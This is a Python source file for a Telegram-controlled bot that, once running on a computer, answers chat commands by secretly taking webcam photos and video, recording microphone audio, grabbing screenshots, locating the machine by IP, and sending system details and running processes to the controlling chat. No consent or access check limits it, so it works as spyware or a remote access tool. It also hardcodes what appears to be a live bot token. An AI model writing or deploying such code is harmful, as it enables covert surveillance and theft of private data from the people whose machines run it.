from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import cv2
import logging
import os
import asyncio
import pyaudio
import wave
import geocoder
import socket
import psutil
import platform
from PIL import ImageGrab

# Replace 'YOUR_BOT_TOKEN' with your actual bot token.
bot_token = '7239458839:AAHTXtF23O2Zfe7q1OSOTtpQvbCjXCflFAg'

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Function to start the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Start command received")
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Bot started!")

# Function to capture an image
def capture_image():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        logger.error("Cannot open camera")
        return None

    ret, frame = cap.read()
    if not ret:
        logger.error("Failed to capture image")
        cap.release()
        return None

    image_path = 'capture.jpg'
    cv2.imwrite(image_path, frame)
    cap.release()
    logger.info(f"Image captured and saved to {image_path}")
    return image_path

# Function to capture a 5-second video
def capture_video():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        logger.error("Cannot open camera")
        return None

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    video_path = 'capture.avi'
    out = cv2.VideoWriter(video_path, fourcc, 20.0, (640, 480))

    for _ in range(100):  # Capture for 5 seconds at 20 fps
        ret, frame = cap.read()
        if not ret:
            logger.error("Failed to capture video frame")
            cap.release()
            out.release()
            return None
        out.write(frame)

    cap.release()
    out.release()
    logger.info(f"Video captured and saved to {video_path}")
    return video_path

# Function to capture a 5-second audio recording
def capture_audio():
    chunk = 1024  # Record in chunks of 1024 samples
    sample_format = pyaudio.paInt16  # 16 bits per sample
    channels = 1
    fs = 44100  # Record at 44100 samples per second
    seconds = 5
    filename = "output.wav"

    p = pyaudio.PyAudio()  # Create an interface to PortAudio

    stream = p.open(format=sample_format,
                    channels=channels,
                    rate=fs,
                    frames_per_buffer=chunk,
                    input=True)

    logger.info("Recording")

    frames = []  # Initialize array to store frames

    # Store data in chunks for 5 seconds
    for _ in range(0, int(fs / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)

    # Stop and close the stream
    stream.stop_stream()
    stream.close()
    # Terminate the PortAudio interface
    p.terminate()

    logger.info("Finished recording")

    # Save the recorded data as a WAV file
    wf = wave.open(filename, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(sample_format))
    wf.setframerate(fs)
    wf.writeframes(b''.join(frames))
    wf.close()

    return filename

# Function to get the current location
def get_location():
    g = geocoder.ip('me')  # You can use 'me' to get the current IP location
    if g.ok:
        return g.latlng
    else:
        logger.error("Failed to get location")
        return None

# Function to get the IP address
def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

# Function to capture a screenshot
def capture_screenshot():
    screenshot = ImageGrab.grab()
    screenshot_path = 'screenshot.png'
    screenshot.save(screenshot_path)
    logger.info(f"Screenshot captured and saved to {screenshot_path}")
    return screenshot_path

# Function to get system information
def get_system_info():
    uname = platform.uname()
    cpu_count = psutil.cpu_count(logical=True)
    mem = psutil.virtual_memory()
    return (f"System: {uname.system}\n"
            f"Node Name: {uname.node}\n"
            f"Release: {uname.release}\n"
            f"Version: {uname.version}\n"
            f"Machine: {uname.machine}\n"
            f"Processor: {uname.processor}\n"
            f"CPU Count: {cpu_count}\n"
            f"Memory Total: {mem.total / (1024 ** 3):.2f} GB\n"
            f"Memory Available: {mem.available / (1024 ** 3):.2f} GB\n")

# Function to get running processes
def get_running_processes():
    processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
    processes_info = '\n'.join([f"{p['pid']}: {p['name']}" for p in processes])
    return processes_info if processes_info else "No processes found."

# Function to get disk usage
def get_disk_usage():
    disk = psutil.disk_usage('/')
    return (f"Total: {disk.total / (1024 ** 3):.2f} GB\n"
            f"Used: {disk.used / (1024 ** 3):.2f} GB\n"
            f"Free: {disk.free / (1024 ** 3):.2f} GB\n"
            f"Percentage Used: {disk.percent}%")

# Function to send a photo
async def send_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Photo command received")
    photo_path = capture_image()
    if photo_path is None or not os.path.exists(photo_path):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to capture photo")
        return

    try:
        with open(photo_path, 'rb') as photo_file:
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=InputFile(photo_file))
        logger.info("Photo sent successfully")
    except Exception as e:
        logger.error(f"Failed to send photo: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send photo")

# Function to send a video
async def send_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Video command received")
    video_path = capture_video()
    if video_path is None or not os.path.exists(video_path):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to capture video")
        return

    try:
        with open(video_path, 'rb') as video_file:
            await context.bot.send_video(chat_id=update.effective_chat.id, video=InputFile(video_file))
        logger.info("Video sent successfully")
    except Exception as e:
        logger.error(f"Failed to send video: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send video")

# Function to send audio
async def send_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Audio command received")
    audio_path = capture_audio()
    if audio_path is None or not os.path.exists(audio_path):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to capture audio")
        return

    try:
        with open(audio_path, 'rb') as audio_file:
            await context.bot.send_audio(chat_id=update.effective_chat.id, audio=InputFile(audio_file))
        logger.info("Audio sent successfully")
    except Exception as e:
        logger.error(f"Failed to send audio: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send audio")

# Function to send location
async def send_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Location command received")
    location = get_location()
    if location is None:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to get location")
        return

    try:
        await context.bot.send_location(chat_id=update.effective_chat.id, latitude=location[0], longitude=location[1])
        logger.info("Location sent successfully")
    except Exception as e:
        logger.error(f"Failed to send location: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send location")

# Function to send IP address
async def send_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("IP command received")
    ip_address = get_ip_address()
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"IP Address: {ip_address}")
        logger.info("IP address sent successfully")
    except Exception as e:
        logger.error(f"Failed to send IP address: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send IP address")

# Function to send screenshot
async def send_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Screenshot command received")
    screenshot_path = capture_screenshot()
    if screenshot_path is None or not os.path.exists(screenshot_path):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to capture screenshot")
        return

    try:
        with open(screenshot_path, 'rb') as screenshot_file:
            await context.bot.send_photo(chat_id=update.effective_chat.id, photo=InputFile(screenshot_file))
        logger.info("Screenshot sent successfully")
    except Exception as e:
        logger.error(f"Failed to send screenshot: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send screenshot")

# Function to send system info
async def send_system_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("System Info command received")
    system_info = get_system_info()
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"System Information:\n{system_info}")
        logger.info("System info sent successfully")
    except Exception as e:
        logger.error(f"Failed to send system info: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send system info")

# Function to send running processes
async def send_running_processes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Running Processes command received")
    processes_info = get_running_processes()
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Running Processes:\n{processes_info}")
        logger.info("Running processes sent successfully")
    except Exception as e:
        logger.error(f"Failed to send running processes: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send running processes")

# Function to send disk usage
async def send_disk_usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Disk Usage command received")
    disk_usage = get_disk_usage()
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Disk Usage:\n{disk_usage}")
        logger.info("Disk usage sent successfully")
    except Exception as e:
        logger.error(f"Failed to send disk usage: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send disk usage")

# Function to send SSH access (mock implementation)
async def send_ssh_access(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("SSH Access command received")
    ssh_access_info = "SSH access is not implemented for security reasons. This is just a mock response."
    try:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=ssh_access_info)
        logger.info("SSH access info sent successfully")
    except Exception as e:
        logger.error(f"Failed to send SSH access info: {e}")
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Failed to send SSH access info")

# Function to send commands list
async def commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command_list = "/start - Start the bot\n/photo - Capture and send a photo\n/video - Capture and send a video\n/audio - Capture and send an audio recording\n/location - Send current location\n/ip - Send IP address\n/screenshot - Capture and send a screenshot\n/systeminfo - Send system information\n/processes - Send running processes\n/diskusage - Send disk usage information\n/ssh - Send SSH access information (mock)\n/stop - Stop the bot"
    await update.message.reply_text(f'Available commands:\n{command_list}')

# Function to stop the bot
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info("Stop command received")
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Bot stopping...")
    asyncio.get_event_loop().stop()

# Error handler
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(msg="Exception while handling an update:", exc_info=context.error)

# Set up the application
app = ApplicationBuilder().token(bot_token).build()

# Add command handlers
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("photo", send_photo))
app.add_handler(CommandHandler("video", send_video))
app.add_handler(CommandHandler("audio", send_audio))
app.add_handler(CommandHandler("location", send_location))
app.add_handler(CommandHandler("ip", send_ip))
app.add_handler(CommandHandler("screenshot", send_screenshot))
app.add_handler(CommandHandler("systeminfo", send_system_info))  # Add system info command handler
app.add_handler(CommandHandler("processes", send_running_processes))  # Add running processes command handler
app.add_handler(CommandHandler("diskusage", send_disk_usage))  # Add disk usage command handler
app.add_handler(CommandHandler("ssh", send_ssh_access))  # Add SSH access command handler
app.add_handler(CommandHandler("commands", commands))  # Add commands list handler
app.add_handler(CommandHandler("stop", stop))
app.add_error_handler(error_handler)

# Start the application
app.run_polling()
